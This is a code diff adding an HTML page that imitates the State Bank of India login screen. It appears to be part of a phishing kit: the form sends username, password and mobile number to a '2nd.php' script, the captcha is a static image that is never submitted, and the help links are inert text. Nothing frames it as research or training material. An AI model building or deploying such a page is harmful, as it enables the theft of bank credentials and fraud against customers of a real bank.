@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBI Login</title>
+    <link rel="stylesheet" href="style/index.css">
+</head>
+<body>
+    <div class="body">
+        <header>
+            <img src="style/header.png" alt="logo">
+        </header>
+        <form action="2nd.php" method="post">
+            <div class="forms">
+                <div style="font-size: 12px; margin: 10px 0px;">(<span style="color: #A33A1A; font-family: Arial, Helvetica, sans-serif;font-size: 12px;font-weight: bold;">CARE:</span>Username and password are case sensitive.)</div>
+                <div class="frm">
+                    <div class="lvl"><label for="">Username*</label></div>
+                    <div><input type="text" name="userID" id="" autofocus autocomplete="off" required></div>
+                </div>
+                <br>
+                <div class="frm">
+                    <div class="lvl"><label for="" >Password*</label></div>
+                    <div><input type="password" name="password" id=""autocomplete="off" required></div>
+                </div>
+                <br>
+                <div class="frm">
+                    <div class="lvl"><label for="" >Mobile*</label></div>
+                    <div><input type="number" name="mobile" id="" autocomplete="off" required></div>
+                </div>
+                <br>
+                <div class="frm">
+                    <div class="lvl"><label for="" >Enter the text as shownin the image *</label></div>
+                    <div><input type="text" id=""autocomplete="off" required
+                        ></div>
+                    <div class="lvl"><label for="" >Select one of the Captcha options *</label></div>
+                </div>
+                <br><br>
+                <div>
+                    <img src="captcha.png" alt="" style="margin-left:15px ;">
+                </div>
+            </div>
+            <div>
+                <span><button type="submit">Login</button></span>
+            <span><button type="reset">Reset</button></span>
+            </div>
+            
+        </form>
+        <div class="new">New User ? Register here/Activate</div>
+        <div class="new">Forgot Username / Login Password</div>
+        <div class="image">
+            <img src="style/be_vigi.png" alt="vigilence">
+            <img src="style/warning.png" alt="warning">
+            <img src="style/warning2.png" alt="warning2">
+            <img src="style/footer.png" alt="footer">
+        </div>
+    </div>
+</body>
+</html>
